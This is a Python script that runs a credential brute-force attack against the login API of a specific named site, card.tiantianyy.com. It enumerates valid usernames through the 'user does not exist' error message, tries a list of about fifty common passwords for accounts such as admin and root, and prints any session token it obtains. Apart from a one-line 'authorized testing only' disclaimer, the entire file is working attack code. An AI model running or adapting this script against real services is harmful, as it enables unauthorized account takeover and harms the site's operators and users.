#!/usr/bin/env python3
"""
Credential Testing Script for Security Assessment
Target: card.tiantianyy.com
Note: For authorized security testing only
"""

import requests
import json
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://card.tiantianyy.com/api"

COMMON_PASSWORDS = [
    "admin", "admin123", "admin888", "admin@123", "123456", "12345678",
    "password", "password123", "123456789", "111111", "000000", "qwerty",
    "abc123", "root", "test", "test123", "admin1", "admin1234", "admin666",
    "admin2024", "admin2025", "Admin123", "Admin@123", "Aa123456", "Pass1234",
    "Welcome1", "P@ssw0rd", "pass123", "pass1234", "letmein", "welcome",
    "monkey", "dragon", "master", "login", "shadow", "sunshine", "princess",
    "football", "baseball", "soccer", "hockey", "batman", "superman",
    "trustno1", "iloveyou", "starwars", "whatever", "qazwsx", "zxcvbnm"
]

def attempt_login(username, password, delay=0.1):
    url = f"{BASE_URL}/user.php?action=login"
    payload = {
        "username": username,
        "password": password
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        time.sleep(delay)
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        result = response.json()
        
        if result.get("success"):
            return {
                "success": True,
                "username": username,
                "password": password,
                "token": result.get("data", {}).get("token"),
                "user": result.get("data", {}).get("user")
            }
        else:
            return {
                "success": False,
                "username": username,
                "password": password,
                "message": result.get("message")
            }
    except Exception as e:
        return {
            "success": False,
            "username": username,
            "password": password,
            "error": str(e)
        }

def test_common_passwords(username, passwords=None, delay=0.2, max_workers=3):
    if passwords is None:
        passwords = COMMON_PASSWORDS
    
    print(f"\n[*] Testing {len(passwords)} passwords for user: {username}")
    print("=" * 60)
    
    found = False
    results = []
    
    for i, password in enumerate(passwords, 1):
        result = attempt_login(username, password, delay)
        
        status = "FOUND!" if result["success"] else "Failed"
        print(f"[{i}/{len(passwords)}] {username}:{password} -> {status}")
        
        if result["success"]:
            found = True
            print("\n" + "=" * 60)
            print("[!!!] CREDENTIAL FOUND!")
            print(f"    Username: {username}")
            print(f"    Password: {password}")
            print(f"    Token: {result['token'][:50]}...")
            print("=" * 60)
            return result
        
        results.append(result)
    
    if not found:
        print(f"\n[-] No valid credentials found for {username}")
    
    return None

def check_user_exists(username):
    result = attempt_login(username, "invalid_test_password_12345")
    if "用户不存在" in result.get("message", ""):
        return False
    return True

def main():
    print("=" * 60)
    print("Credential Testing Script")
    print("Target: card.tiantianyy.com")
    print("For Authorized Security Testing Only")
    print("=" * 60)
    
    target_users = ["admin", "administrator", "root", "test", "guest", "user"]
    
    print("\n[*] Checking for existing users...")
    existing_users = []
    for user in target_users:
        exists = check_user_exists(user)
        status = "EXISTS" if exists else "NOT FOUND"
        print(f"    {user}: {status}")
        if exists:
            existing_users.append(user)
    
    if not existing_users:
        print("\n[-] No target users found")
        return
    
    print(f"\n[*] Found {len(existing_users)} existing users")
    
    for user in existing_users:
        print(f"\n{'='*60}")
        print(f"[*] Testing credentials for: {user}")
        result = test_common_passwords(user, delay=0.3)
        
        if result:
            print(f"\n[+] Valid credentials found!")
            break

if __name__ == "__main__":
    if len(sys.argv) > 1:
        username = sys.argv[1]
        passwords = sys.argv[2:] if len(sys.argv) > 2 else COMMON_PASSWORDS
        test_common_passwords(username, passwords)
    else:
        main()
